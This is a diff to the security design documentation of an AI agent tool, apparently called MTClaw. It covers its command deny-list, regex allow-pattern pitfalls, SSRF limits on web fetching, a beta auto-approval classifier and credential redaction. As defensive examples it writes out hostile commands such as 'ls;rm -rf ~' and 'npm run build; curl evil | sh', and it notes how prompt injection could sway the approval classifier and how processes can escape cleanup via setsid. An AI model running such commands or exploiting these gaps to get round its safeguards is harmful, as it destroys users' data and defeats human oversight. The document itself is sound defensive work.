@@ -77,10 +77,10 @@ it in the pipeline that could downgrade a deny match to a prompt.
 
 The default deny-list (written by `onboard`, OS-appropriate - see
 `internal/tools/deny_defaults.go`) catches unconditionally destructive or
-irreversible commands: recursive/forced `rm` (short flags, long flags, and
-path-prefixed forms), `find -delete`, `mkfs`, writing to raw disk devices,
+irreversible commands: recursive/forced `rm` (short flags of either case, long flags, path-prefixed
+forms, and `rm` glued to a separator such as `ls;rm -rf ~`), `find -delete`, `mkfs`, writing to raw disk devices,
 fork bombs, `shutdown`/`reboot`/`halt`, `chmod 777 /`, pipe-to-shell
-downloads, force-pushes, account/password commands, and shell history
+downloads, force-pushes (`-f`, `--force`, `--force-with-lease`, `+refspec`), account/password commands, and shell history
 clearing - and the PowerShell equivalents on Windows.
 
 **It stops accidents and naive prompt injection. It does not stop a
@@ -106,9 +106,49 @@ direction here - a false-positive refusal costs you one `tools.exec.allow`
 entry; an under-block costs data - but it is worth knowing about before it
 surprises you mid-conversation.
 
+The force-push rule tolerates only git's own global options between `git`
+and `push` (`git -C . push -f` is caught), so `git commit -m 'push +1'` is
+not refused; the pattern and its accepted/rejected corpus live in
+`internal/tools/deny_defaults.go` and `internal/tools/policy_test.go`. Any
+argument to a real `git push` that looks like `-f...` or `+ref` still
+matches, including a branch spelled `+something`.
+
+A `tools.exec.allow` pattern is a regex over the whole command, and `.`
+matches `;`, `&` and `|`: `^npm run .+$` also allows `npm run build; curl
+evil | sh` with no prompt (deny rules still apply). Anchor allow patterns to
+a tight character class, for example `^npm run [\w:.-]+$`.
+
+**Process cleanup is not a sandbox.** On unix a timed-out or cancelled
+command is killed by signalling its process group, so a descendant that
+calls `setsid` (or otherwise leaves the group) survives. On Windows the
+command is placed in a Job Object; a grandchild started in the short window
+before the shell is assigned to the job is outside it. Both are
+best-effort.
+
 An **empty deny-list with `tools.exec.enabled: true` is not a load error**,
 but `mtclaw doctor` warns about it loudly, because it removes the only real
 enforcement boundary in this design entirely.
+
+## What `web_fetch` refuses
+
+`web_fetch` is the tool most exposed to attacker-chosen URLs, so its limits
+are fixed in code (`internal/tools/web_fetch.go`) and not configurable:
+
+- Only `http` and `https`, and only `GET`. A redirect to any other scheme is
+  refused, and at most 3 redirects are followed.
+- The address is checked at connect time, on every dial, not just on the
+  hostname up front. A public URL that redirects to a blocked address, or a
+  DNS answer that changes between lookups, is refused on that hop.
+- Blocked ranges: loopback, private (RFC 1918 and IPv6 ULA), link-local,
+  multicast, unspecified (`0.0.0.0/8`, `::`), CGNAT (`100.64.0.0/10`), and a
+  few reserved IPv4 blocks (`192.0.0.0/24`, `198.18.0.0/15`, `240.0.0.0/4`);
+  the cloud-metadata address is link-local, so it is covered. IPv4-mapped, NAT64, 6to4, and IPv4-compatible
+  IPv6 forms are unwrapped and checked as the IPv4 address they embed.
+- Responses with a binary content type (images, archives) are skipped rather
+  than read into the model's context.
+
+The fetched text is still untrusted input that reaches the model; see the
+threat model above.
 
 ## Why `auto` mode is beta
 
@@ -121,6 +161,8 @@ weakening of the security posture, because:
   adversarial input. The same prompt injection that produced a dangerous
   command in the first place can plausibly talk the classifier into scoring
   it as low-risk.
+- The classifier call has a fixed 10 s timeout, after which the command goes
+  to a human.
 - The classifier only ever sees the command string, its cwd, and the shell -
   never the tool output that may have produced the command - which narrows
   the injection channel but does not close it.
@@ -155,11 +197,14 @@ command carrying an inline credential (`curl -H "Authorization: Bearer
 sk-..."`, `PGPASSWORD=... psql`, `aws --secret-access-key ...`) would publish
 that credential to a third party the moment MTClaw asks about it, so
 `RedactSecrets` masks common credential shapes (`Bearer` tokens,
-`Authorization:` headers, `--token`/`--password`/`--secret*` flags, `-p<value>`,
+`Authorization:` and `X-Api-Key:` headers, URL userinfo passwords
+(`https://user:pass@host` becomes `https://user:[REDACTED]@host`),
+`--token`/`--password`/`--secret*` flags, `-p<value>`,
 any `*_KEY=`/`*_TOKEN=`/`*_SECRET=`/`*_PASSWORD=`/`*_PASSWD=` assignment (so
 `API_KEY=`, `GITHUB_TOKEN=`, `AWS_SECRET_ACCESS_KEY=`, and the bare
 `PASSWORD=` form are all caught, not just the exact keyword alone), and
-common key shapes like `sk-...`, `ghp_...`, `AKIA...`, and long base64/hex
+common key shapes like `sk-...`, GitHub `ghp_`/`gho_`/`ghu_`/`ghs_`/`ghr_`
+and `github_pat_...` tokens, `AKIA...`, and long base64/hex
 runs (only when the run mixes uppercase, lowercase, and a digit - an
 all-lowercase hex string, such as a git SHA, is deliberately left alone so a
 commit hash in a command is not masked) before a command ever reaches an
@@ -182,7 +227,12 @@ Put them in an env file the command reads instead, or in the shell
 environment MTClaw's own process inherits, never as literal text the model
 has to type into a command.
 
+The keyword separators are bounded so a keyword with no value cannot
+swallow the next word: `Bearer`, `Authorization:` and `X-Api-Key:` skip only
+spaces and tabs, and `--secret*` spans only flag-name characters.
+
 A command longer than about 3500 characters after redaction is refused
+(audited as `refused_too_long`, decider `policy`)
 before it ever reaches an approval prompt - the model gets a clear error
 back instead - rather than shown as a truncated preview a human could
 approve without seeing in full. `exec_audit.command` is not bound by that
